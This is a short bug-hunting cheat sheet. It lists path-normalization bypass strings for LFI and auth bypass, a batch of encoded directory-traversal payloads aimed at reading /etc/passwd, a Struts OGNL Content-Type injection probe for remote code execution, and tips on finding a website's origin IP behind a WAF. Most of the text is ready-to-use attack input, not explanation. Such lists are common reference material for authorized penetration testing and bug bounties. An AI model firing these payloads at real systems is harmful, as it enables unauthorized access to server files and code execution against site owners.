**Bug Hunting Tricks**

**Extracting links, paths from source of a website**
```
Use Xidel
https://github.com/benibela/xidel
Usage:-
xidel http://apple.com -f '//script/@src'
xidel http://apple.com -f '//link/@href'
xidel http://apple.com -f '//a/@href'

References:-
https://www.videlibri.de/xidel.html
```

**Bypasses For LFI, Auth Bypass**
```
api/v1/..%2f
api/v1/..;/
api/v1/../
api/v1..%00/
api/v1/..%0d/
api/v1/..%5c
api/v1/..\
api/v1/..%ff/
api/v1/%2e%2e%2f
api/v1/.%2e/
api/v1/%3f (?)
api/v1/%26 (&)
api/v1/%23 (#)
or
/foo;x=x/bar/
above tricks work well when you have a ngnix server in front of an tomcat
References:- https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
```

```
../../../../../../../../../../../../etc/passwd%00
//..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd
....//....//....//etc/passwd
....\/....\/....\/etc/passwd
/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
..%252f..%252f..%252fetc%252fpasswd
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
%252e%252e%252fetc%252fpasswd
...//....//etc/passwd
..///////..////..//////etc/passwd
/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
.%00./.%00./.%00./.%00./.%00./.%00./.%00./.%00./.%00./.%00./etc/passwd
/..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\/etc/passwd


```

**Struts RCE**
```
Content-Type: ${#context["com.opensymphone.xwork2.dispatcher.HttpServletResponse"].addHeader("Struts-RCE",191*7)}.multipart/form-data
```

**WAF**
```
#Finding Origin IP 
Check IP address history from https://viewdns.info/
References:- https://twitter.com/yassineaboukir/status/932908449775669248
https://github.com/christophetd/CloudFlair
```
